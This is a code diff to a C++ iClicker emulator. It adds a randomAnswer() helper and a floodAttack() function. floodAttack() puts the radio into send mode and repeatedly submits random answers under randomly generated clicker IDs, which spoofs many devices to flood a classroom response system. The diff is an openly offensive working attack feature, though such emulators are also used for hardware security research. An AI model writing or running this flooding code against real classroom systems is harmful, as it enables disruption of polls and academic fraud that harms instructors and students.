@@ -55,7 +55,21 @@ void iClickerEmulator::randomId(uint8_t *ret)
     ret[0] = (uint8_t)random(256);
     ret[1] = (uint8_t)random(256);
     ret[2] = (uint8_t)random(256);
-    ret[3] = (uint8_t)ret[0]^ret[1]^ret[2];
+    ret[3] = ret[0]^ret[1]^ret[2];
+}
+
+
+iClickerAnswer_t iClickerEmulator::randomAnswer()
+{
+    const uint8_t ans[] = {
+        (uint8_t)ANSWER_A,
+        (uint8_t)ANSWER_B,
+        (uint8_t)ANSWER_C,
+        (uint8_t)ANSWER_D,
+        (uint8_t)ANSWER_E
+    };
+
+    return (iClickerAnswer_t)ans[random(sizeof(ans))];
 }
 
 
@@ -174,5 +188,26 @@ void iClickerEmulator::isrRecvCallback(uint8_t *buf, uint8_t numBytes)
     }
 
     _self->_recvCallback(&recvd);
+}
 
+
+
+bool iClickerEmulator::floodAttack(uint32_t num, uint32_t interval)
+{
+    uint8_t id[ICLICKER_ID_LEN];
+    iClickerAnswer_t ans;
+    // put radio into correct mode
+    configureRadio(CHANNEL_SEND, DEFAULT_SEND_SYNC_ADDR);
+
+    for (uint32_t i=0; i < num; i++) {
+        randomId(id); //get random id
+        ans = randomAnswer();
+        //submit answer
+        if(!submitAnswer(id, ans))
+            return false;
+
+        delay(interval);
+    }
+
+    return true;
 }
